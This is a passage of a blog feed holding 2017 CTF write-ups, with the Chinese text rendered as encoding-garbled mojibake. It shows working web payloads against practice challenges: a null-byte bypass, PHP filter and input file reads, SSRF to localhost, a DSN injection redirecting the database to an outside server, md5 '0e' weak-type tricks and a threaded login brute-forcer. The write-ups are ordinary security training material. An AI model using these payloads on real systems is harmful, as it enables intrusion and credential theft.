<p>åˆ©ç”¨<code>%00</code>å¯ä»¥æˆªæ–­<code>ereg</code>ï¼Œæ„é€ <code>?password=1%00â€”</code><br><code>flag{Maybe_using_rexpexp_wasnt_a_clever_move}</code></p>
<h2 id="æ›²å¥‡"><a href="#æ›²å¥‡" class="headerlink" title="æ›²å¥‡"></a>æ›²å¥‡</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-quqi/index.php?line=&amp;file=a2V5LnR4dA==</div></pre></td></tr></table></figure>
<p>fileå‚æ•°åé¢æ˜¯<code>base64ç¼–ç </code>çš„<code>key.txt</code>ï¼Œlineæ˜¯è¡Œæ•°<br>ç¼–å†™pyè„šæœ¬è¯»å–<code>index.php</code>æºç <br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># by:xishir</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</div><div class="line"></div><div class="line">r1=r.session()</div><div class="line">url=<span class="string">'http://ctf1.shiyanbar.com/shian-quqi/index.php?line=&#123;0&#125;&amp;file=aW5kZXgucGhw'</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</div><div class="line">	r2=r1.get(url.format(str(i)))</div><div class="line">	<span class="keyword">print</span> r</div></pre></td></tr></table></figure></p>
<p>è¯»å–åˆ°çš„index.phpå¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])?$_GET[<span class="string">'file'</span>]:<span class="string">""</span>);</div><div class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;file=a2V5LnR4dA=="</span>);</div><div class="line"></div><div class="line">$file_list = <span class="keyword">array</span>(</div><div class="line"><span class="string">'0'</span> =&gt;<span class="string">'key.txt'</span>,</div><div class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</div><div class="line">);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'key'</span>]) &amp;&amp; $_COOKIE[<span class="string">'key'</span>]==<span class="string">'li_lr_480'</span>)&#123;</div><div class="line">$file_list[<span class="number">2</span>]=<span class="string">'thisis_flag.php'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</div><div class="line">$fa = file($file);</div><div class="line"><span class="keyword">echo</span> $fa[$line];</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>å¯ä»¥çœ‹åˆ°å½“cookieä¸­çš„<code>key</code>å€¼ä¸º<code>li_lr_480</code>ï¼Œå³å¯è¯»å–<code>thisis_flag.php</code>æ–‡ä»¶<br><img src="/img/2017-sab-web2.png" alt=""><br><code>flag{UHGgd3rfH*(3HFhuiEIWF}</code></p>
<h2 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-leixing/</div></pre></td></tr></table></figure>
<p>ç»å…¸å¼±ç±»å‹é¢˜ï¼Œæ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-leixing/?x1=0&amp;x2=&#123;&apos;x21&apos;:&apos;2018a&apos;,&apos;x22&apos;:[[1],0]&#125;&amp;x3=XIPU-=3CS</div></pre></td></tr></table></figure></p>
<p>å…¶ä¸­<code>XIPU-=3CS</code>md5åŠ å¯†åçš„8åˆ°16ä½ä»¥0eå¼€å¤´ï¼Œå…¶ä»–å…¨æ˜¯æ•°å­—<br>ä¸‹é¢æ˜¯è·‘md5è„šæœ¬<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line">b=<span class="string">'-=[],./;"1234567890abcdefghijklmnoprstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(str1)</span>:</span></div><div class="line">    <span class="keyword">if</span> hashlib.md5(str1).hexdigest()[<span class="number">8</span>:<span class="number">10</span>]==<span class="string">'0e'</span>:</div><div class="line">        flag=<span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> hashlib.md5(str1).hexdigest()[<span class="number">10</span>:<span class="number">24</span>]:</div><div class="line">            <span class="keyword">if</span> i&gt;<span class="string">'9'</span>:</div><div class="line">                flag=<span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span></div><div class="line">        <span class="keyword">if</span> flag==<span class="number">0</span>:</div><div class="line">            <span class="keyword">print</span> str1</div><div class="line">            input(<span class="string">"success"</span>)</div><div class="line">    <span class="keyword">if</span>(len(str1)&gt;<span class="number">8</span>):</div><div class="line">        <span class="keyword">return</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> b:</div><div class="line">            find(str1+i)</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    find(<span class="string">'XIPU'</span>)</div></pre></td></tr></table></figure></p>
<p><code>CTF{Php_1s_bstl4_1a}</code></p>
<h2 id="ç™»å½•"><a href="#ç™»å½•" class="headerlink" title="ç™»å½•"></a>ç™»å½•</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-s/</div></pre></td></tr></table></figure>
<p>æç¤ºå¯†ç <code>5ä½æ•°å­—</code>ï¼Œè·‘å¯†ç <br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># by:xishir</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"></div><div class="line"></div><div class="line">url=<span class="string">'http://ctf1.shiyanbar.com/shian-s/index.php'</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, arg)</span>:</span></div><div class="line">		super(MyThread, self).__init__()</div><div class="line">		self.arg = arg</div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="keyword">for</span> site <span class="keyword">in</span> self.arg:</div><div class="line">			scan(site)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(i)</span>:</span></div><div class="line">    <span class="keyword">print</span> i</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">    	r1=r.session()</div><div class="line">        r3=r1.get(url)</div><div class="line">        ss=re.findall(<span class="string">r'type="text"&gt;&lt;br&gt;&lt;br&gt;(.*?)&lt;br&gt;&lt;br&gt;'</span>,r3.text)</div><div class="line">        url1=url+<span class="string">'?username=admin&amp;password='</span>+i+<span class="string">'&amp;randcode='</span>+ss[<span class="number">0</span>]</div><div class="line">        r2=r1.get(url1)</div><div class="line">        r2.encoding = <span class="string">'utf-8'</span></div><div class="line">        <span class="comment">#print r2.text</span></div><div class="line">        <span class="keyword">if</span> len(r2.text)!=<span class="number">146</span>:</div><div class="line">        	<span class="keyword">print</span> r2.text,url1</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">            <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	thread_num=<span class="number">100</span></div><div class="line">	site = [[] * <span class="number">1005</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(thread_num)]</div><div class="line">	threads = []</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>):</div><div class="line">		j = i % thread_num</div><div class="line">		s = <span class="string">'%05d'</span> % i</div><div class="line">		site[j].append(s)</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> site:</div><div class="line">		t = MyThread(i)</div><div class="line">		threads.append(t)</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> threads:</div><div class="line">		i.setDaemon(<span class="keyword">True</span>)</div><div class="line">		i.start()</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> threads: </div><div class="line">		i.join()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure></p>
<p>è·‘å‡ºæ¥å¯†ç ä¸º<code>00325</code><br><code>flag{U1tkOdgutaVWucdy2AbDWXPGkDx9bS2a}</code></p>
<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-du/</div></pre></td></tr></table></figure>
<p><code>phpä¼ªåè®®php://input</code>é€šè¿‡ç¬¬ä¸€ä¸ªif<br>å†åˆ©ç”¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf1.shiyanbar.com/shian-du/?user=php://input&amp;file=php://filter/read=convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure></p>
<p>è¯»å–index.phpå’Œclass.phpæºç <br>æç¤ºflagåœ¨<code>f1a9.php</code>ä¸­ï¼Œf1a9è¢«è¿‡æ»¤äº†ï¼Œäºæ˜¯æ„é€ <code>ååºåˆ—åŒ–</code>å­—ç¬¦ä¸²è¯»å–flagï¼Œå¬è¯´å¤§ä½¬ä»¬ç”¨è¿™ä¸ªç›´æ¥è¯»å–äº†å…¶ä»–webé¢˜çš„flagï¼Œè†œ<br><img src="/img/2017-sab-web5.png" alt=""><br><code>flag_Xd{hSh_ctf:e@syt0g3t}</code> </p>
<h1 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h1><h2 id="Console"><a href="#Console" class="headerlink" title="Console"></a>Console</h2><p>PEIDæŸ¥å‡ºæ¥æ˜¯<code>C#</code>å†™çš„ï¼ŒILSpyåç¼–è¯‘å¾—åˆ°æºç <br><img src="/img/2017-sab-re1.png" alt=""><br>å°†ä»£ç å–å‡ºæ¥ç¼–è¯‘è¿è¡Œï¼Œè¾“å‡ºstring bå¾—åˆ°flag<br><code>flag{967DDDFBCD32C1F53527C221D9E40A0B}</code></p>
<h2 id="android"><a href="#android" class="headerlink" title="android"></a>android</h2><p>å‚è€ƒï¼š<br><a href="https://ctf.rip/bsides-sf-ctf-2017-flag-receiver-mobile-reverse-engineering/" target="_blank" rel="noopener">https://ctf.rip/bsides-sf-ctf-2017-flag-receiver-mobile-reverse-engineering/</a><br><code>TheseIntentsAreFunAndEasyToUse</code></p>
<h2 id="ç®€å•ç®—æ³•"><a href="#ç®€å•ç®—æ³•" class="headerlink" title="ç®€å•ç®—æ³•"></a>ç®€å•ç®—æ³•</h2><p>é˜Ÿå‹åšçš„</p>
<h1 id="éšå†™"><a href="#éšå†™" class="headerlink" title="éšå†™"></a>éšå†™</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>æŠŠbmpä¿å­˜ä¸º<code>png</code>ï¼ŒStegsolve.jaræ‰“å¼€ï¼Œæ‰«æäºŒç»´ç <br><img src="/img/2017-sab-ste1.png" alt=""><br><code>flag{139711e8e9ed545e}</code></p>
<h2 id="æ–‘é©¬æ–‘é©¬"><a href="#æ–‘é©¬æ–‘é©¬" class="headerlink" title="æ–‘é©¬æ–‘é©¬"></a>æ–‘é©¬æ–‘é©¬</h2><p>ç”¨pså¤„ç†ï¼Œæå–å‡º<code>æ¡å½¢ç </code>éƒ¨åˆ†ï¼Œç”¨qqæ‰«æå¾—åˆ°flag<br><img src="/img/2017-sab-ste2.png" alt=""><br><code>Tenshine</code></p>
<h2 id="CreateByWho"><a href="#CreateByWho" class="headerlink" title="CreateByWho"></a>CreateByWho</h2><p>æ‹¼äºŒç»´ç ï¼Œéœ€è¦è¡¥<code>ä¸‰å—å›å‹</code>çš„å—<br><img src="/img/2017-sab-ste3.png" alt=""><br><code>Create-By-SimpleLab</code></p>
<h2 id="é€‚åˆä½œä¸ºæ¡Œé¢çš„å›¾ç‰‡"><a href="#é€‚åˆä½œä¸ºæ¡Œé¢çš„å›¾ç‰‡" class="headerlink" title="é€‚åˆä½œä¸ºæ¡Œé¢çš„å›¾ç‰‡"></a>é€‚åˆä½œä¸ºæ¡Œé¢çš„å›¾ç‰‡</h2><p>Stegsolve.jaræ‰“å¼€ï¼Œæ‰«äºŒç»´ç ï¼Œä¿å­˜ä¸º<code>pyc</code>ï¼Œ<code>åç¼–è¯‘</code>åè¿è¡Œå¾—åˆ°flag<br><img src="/img/2017-sab-ste4.png" alt=""><br><code>flag{38a57032085441e7}</code></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="reverseMe"><a href="#reverseMe" class="headerlink" title="reverseMe"></a>reverseMe</h2><p>winhexæ‰“å¼€ååœ¨å°¾éƒ¨å‘ç°<code>photoshop</code>å­—æ ·ï¼Œä¸è¿‡æ˜¯å€’åºçš„ï¼Œå†™ä¸ªpyè„šæœ¬å€’åºä¿å­˜å¾—åˆ°å›¾ç‰‡ï¼Œå†ç”¨pså¤„ç†å¾—åˆ°flag<br><img src="/img/2017-sab-misc1.png" alt=""><br><code>flag{4f7548f93c7bef1dc6a0542cf04e796e}</code></p>
<h2 id="çå¦®çš„qqå·"><a href="#çå¦®çš„qqå·" class="headerlink" title="çå¦®çš„qqå·"></a>çå¦®çš„qqå·</h2><p>æ•°å­¦é¢˜ï¼Œä¹Ÿå¯ä»¥å†™ä¸ªpyè·‘ä¸€ä¸‹å°±å‡ºæ¥äº†<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># by:xishir</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>,<span class="number">100000</span>):</div><div class="line">	j=i*<span class="number">4</span></div><div class="line">	<span class="keyword">if</span> j&lt;<span class="number">100000</span>:</div><div class="line">		si=str(i)</div><div class="line">		sj=str(j)</div><div class="line">		<span class="keyword">if</span> si[<span class="number">0</span>]==sj[<span class="number">4</span>] <span class="keyword">and</span> si[<span class="number">1</span>]==sj[<span class="number">3</span>] <span class="keyword">and</span> si[<span class="number">2</span>]==sj[<span class="number">2</span>] <span class="keyword">and</span> si[<span class="number">3</span>]==sj[<span class="number">1</span>] <span class="keyword">and</span> si[<span class="number">4</span>]==sj[<span class="number">0</span>]:</div><div class="line">			<span class="keyword">print</span> j</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<h2 id="å¿ƒä»ªçš„å…¬å¸"><a href="#å¿ƒä»ªçš„å…¬å¸" class="headerlink" title="å¿ƒä»ªçš„å…¬å¸"></a>å¿ƒä»ªçš„å…¬å¸</h2><p>wiresharkæ‰“å¼€ï¼Œè¿½è¸ªhttpæµæ‰¾åˆ°flag<br><img src="/img/2017-sab-misc3.png" alt=""><br><code>fl4g:{ftop_Is_Waiting_4_y}</code></p>
<h1 id="å¯†ç å­¦"><a href="#å¯†ç å­¦" class="headerlink" title="å¯†ç å­¦"></a>å¯†ç å­¦</h1><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">c= <span class="number">2044619806634581710230401748541393297937319</span> </div><div class="line">n= <span class="number">92164540447138944597127069158431585971338721360079328713704210939368383094265948407248342716209676429509660101179587761913570951794712775006017595393099131542462929920832865544705879355440749903797967940767833598657143883346150948256232023103001435628434505839331854097791025034667912357133996133877280328143</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> libnum</div><div class="line"><span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">10</span>):</div><div class="line">    m = libnum.nroot(c,e)</div><div class="line">    <span class="keyword">if</span> m**e==c:</div><div class="line">        <span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"e:"</span>,e</div><div class="line"><span class="keyword">print</span> <span class="string">"m:"</span>,m</div><div class="line">flag = libnum.n2s(m)</div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure>
<p><code>so_low</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;emmmmmmmmï¼Œå…³äºæ¯”èµ›è´¨é‡é—®é¢˜ï¼Œå‡ºé—¨å·¦è½¬&lt;a href=&quot;https://www.zhihu.com/question/66360616&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;çŸ¥ä¹&lt;/a&gt;ï¼Œå‡ºé—¨å³è½¬&lt;a href=&quot;https://ctfrank.org/events/39&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ctfrank&lt;/a&gt;&lt;br&gt;æ˜¨å¤©ç«Ÿç„¶æ¥åˆ°äº†å†³èµ›é€šçŸ¥ç”µè¯ï¼Œè€ƒè™‘åˆ°å„ç§é—®é¢˜ï¼Œæœ€åè¿˜æ˜¯å¼ƒæƒäº†&lt;br&gt;ä»¥ä¸‹æ˜¯çº¿ä¸Šèµ›wp&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>2017 ISGä¿¡æ¯å®‰å…¨æŠ€èƒ½å¤§èµ›çº¿ä¸Šèµ› WriteUp</title>
    <link href="https://www.codemonster.cn/2017/08/31/2017-isg-writeup/"/>
    <id>https://www.codemonster.cn/2017/08/31/2017-isg-writeup/</id>
    <published>2017-08-31T15:05:27.000Z</published>
    <updated>2018-05-04T07:47:50.012Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>åŠ ç¾¤åœ¨å…¬å‘Šå¾—åˆ°ä¸€ä¸²å­—ç¬¦ï¼Œ16è¿›åˆ¶è½¬å­—ç¬¦ä¸²å¾—åˆ°flag<br><a id="more"></a></p>
<h2 id="ISGCoinMarket"><a href="#ISGCoinMarket" class="headerlink" title="ISGCoinMarket"></a>ISGCoinMarket</h2><p>å¾ˆæœ‰æ„æ€çš„é¢˜ï¼Œåˆå§‹ç»™ä½ 1å…ƒäººæ°‘å¸å’Œ0.0056ä¸ªISGå¸ï¼Œä½ å¯ä»¥å‘å¸ƒäº¤æ˜“ï¼Œä¹Ÿå¯ä»¥å’Œåˆ«äººäº¤æ˜“ï¼Œé€šè¿‡äº¤æ˜“å¾—åˆ°2000äººæ°‘å¸å’Œ2000ISGå¸å³å¯å¾—åˆ°flagã€‚</p>
<p>è¿™é‡Œä¸»è¦æ˜¯æ²¡æœ‰é™åˆ¶è´Ÿæ•°ï¼Œæˆ‘çš„è§£æ³•æ˜¯åˆ›å»º4ä¸ªå·</p>
<p>u1-&gt;u2   æŠŠu1çš„ISGå¸åˆ·åˆ°4000000ï¼Œæ±‡ç‡ä¸º0.0059ï¼Œå¯ä»¥çœ‹ä½œ<code>u1ä½ä»·ä¹°å…¥ISG</code></p>
<p>u3-&gt;u4   æŠŠu3çš„ISGå¸åˆ·åˆ°40000000ï¼Œäººæ°‘å¸ä¸ºè´Ÿæ•°ï¼Œu4åˆ™ç›¸å</p>
<p>ç„¶ååˆ©ç”¨u4çš„äººæ°‘å¸å»ä¹°u1çš„ISGï¼Œæ±‡ç‡ä½0.0054ï¼Œå¯ä»¥çœ‹ä½œ<code>u1é«˜ä»·å–å‡ºISG</code></p>
<p>ä¸€ä¹°ä¸€å–u1å°±æŒ£åˆ°äº†è¶³å¤Ÿçš„é’±</p>
<p><img src="/img/2017isg1.png" alt=""> </p>
<h2 id="Remix"><a href="#Remix" class="headerlink" title="Remix"></a>Remix</h2><p>å¯ä»¥è¯»å–å›¾ç‰‡å¹¶base64è§£ç ï¼Œå¹¶ä¸çŸ¥é“åå°é€»è¾‘ï¼Œå³é”®æŸ¥çœ‹æºä»£ç æç¤ºflagåœ¨7827ç«¯å£ï¼ˆæˆ‘ä¹Ÿä¸è®°å¾—æ˜¯ä¸æ˜¯è¿™ä¸ªç«¯å£ï¼‰ï¼Œäºæ˜¯æƒ³åˆ°SSRFï¼Œæ„é€ <br><code>?targe=http://localhost:7827</code>,<br>å°†å¾—åˆ°çš„base64è§£ç å³å¯å¾—åˆ°flag</p>
<h2 id="wmwcms"><a href="#wmwcms" class="headerlink" title="wmwcms"></a>wmwcms</h2><p>robots.txtæç¤ºç»™äº†ä¸ªrarï¼Œä¸‹è½½ä¸‹æ¥æ˜¯ç½‘ç«™æºç ï¼Œå®¡è®¡å‘ç°è¿æ¥æ•°æ®åº“æ—¶å­˜åœ¨æ³¨å…¥ï¼Œ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include_once</span> <span class="string">'func.php'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'dsn'</span>]))&#123;</div><div class="line">    $dsn = $_REQUEST[<span class="string">'dsn'</span>];</div><div class="line">&#125; <span class="keyword">else</span>&#123;</div><div class="line">    $dsn = <span class="string">"wmwcms"</span>;</div><div class="line">&#125;</div><div class="line">$dsn = <span class="string">"mysql:dbname=&#123;$dsn&#125;"</span>;</div><div class="line">$username = <span class="string">'wmwcms'</span>;</div><div class="line">$password = <span class="string">'%glVYKTkLtQ22'</span>;</div><div class="line">$options = <span class="keyword">array</span>(</div><div class="line">    PDO::MYSQL_ATTR_INIT_COMMAND =&gt; <span class="string">'SET names utf8'</span>,</div><div class="line">    );</div><div class="line">$dbh = <span class="keyword">new</span> PDO($dsn, $username, $password, $options);</div></pre></td></tr></table></figure></p>
<p>ç¬¬8è¡Œçš„æ•°æ®åº“è¿æ¥å¯ä»¥ç”±ç”¨æˆ·æ§åˆ¶ï¼Œäºæ˜¯æˆ‘ä»¬åœ¨è¿œç¨‹æœåŠ¡å™¨æ­å»ºç›¸åŒçš„æ•°æ®åº“ã€ç”¨æˆ·å¯†ç ä¹Ÿç›¸åŒã€è¡¨åå’Œå­—æ®µä¹Ÿç›¸åŒï¼Œç„¶åæ„é€ <br><code>dsn=wmwcms;8.8.8.8</code><br>å³å¯è®©è¿™é“é¢˜è¿æ¥åˆ°ä½ çš„æœåŠ¡å™¨ï¼Œç„¶åä½¿ç”¨<code>action=img</code>è¯»å–æ•°æ®åº“ä¸­<code>portrait</code>å­—æ®µæ‰€åœ¨ä½ç½®çš„æ–‡ä»¶ï¼Œå³å¯è¯»å–åˆ°flag</p>
<h2 id="BMP-Wannacry-2"><a href="#BMP-Wannacry-2" class="headerlink" title="BMP Wannacry-2"></a>BMP Wannacry-2</h2><p>å¤§ä½¬è¯´æ˜¯<code>bmpéšå†™</code>ï¼Œæ²¡åšå‡ºæ¥ï¼Œç•™å‘å¾…å¡«</p>
<p><a href="https://doegox.github.io/ElectronicColoringBook/" target="_blank" rel="noopener">https://doegox.github.io/ElectronicColoringBook/</a></p>
<h2 id="æ„Ÿæƒ³"><a href="#æ„Ÿæƒ³" class="headerlink" title="æ„Ÿæƒ³"></a>æ„Ÿæƒ³</h2><p>è¿™ä¸ªæ¯”èµ›éš¾åº¦ä¸­ä¸Šï¼Œå‚èµ›å¯¹è±¡ä¸ºå„å¤§ä¼ä¸šå®‰å…¨å›¢é˜Ÿï¼Œçœ‹åˆ°äº†è®¸å¤šå¤§ä½¬ï¼Œè†œ</p>
<p><img src="/img/2017isg2.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ç­¾åˆ°&quot;&gt;&lt;a href=&quot;#ç­¾åˆ°&quot; class=&quot;headerlink&quot; title=&quot;ç­¾åˆ°&quot;&gt;&lt;/a&gt;ç­¾åˆ°&lt;/h2&gt;&lt;p&gt;åŠ ç¾¤åœ¨å…¬å‘Šå¾—åˆ°ä¸€ä¸²å­—ç¬¦ï¼Œ16è¿›åˆ¶è½¬å­—ç¬¦ä¸²å¾—åˆ°flag&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="å®¡è®¡" scheme="https://www.codemonster.cn/tags/%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="æ³¨å…¥" scheme="https://www.codemonster.cn/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2017 XNUCA-ç¬¬ä¸€æœŸï¼šWeb WriteUp</title>
    <link href="https://www.codemonster.cn/2017/08/30/2017-xnuca-web-writeup/"/>
    <id>https://www.codemonster.cn/2017/08/30/2017-xnuca-web-writeup/</id>
    <published>2017-08-30T14:34:58.000Z</published>
    <updated>2018-05-04T07:47:50.014Z</updated>
    
    <content type="html"><![CDATA[<h2 id="No-1-ä½ å–œæ¬¢é¢œæ–‡å­—ä¹ˆ"><a href="#No-1-ä½ å–œæ¬¢é¢œæ–‡å­—ä¹ˆ" class="headerlink" title="#No.1 ä½ å–œæ¬¢é¢œæ–‡å­—ä¹ˆ"></a>#No.1 ä½ å–œæ¬¢é¢œæ–‡å­—ä¹ˆ</h2><p>é‡ç½®å¯†ç è¾“å…¥adminå’Œå–œæ¬¢å°±æ‹¿ä¸‹flagäº†<br><a id="more"></a></p>
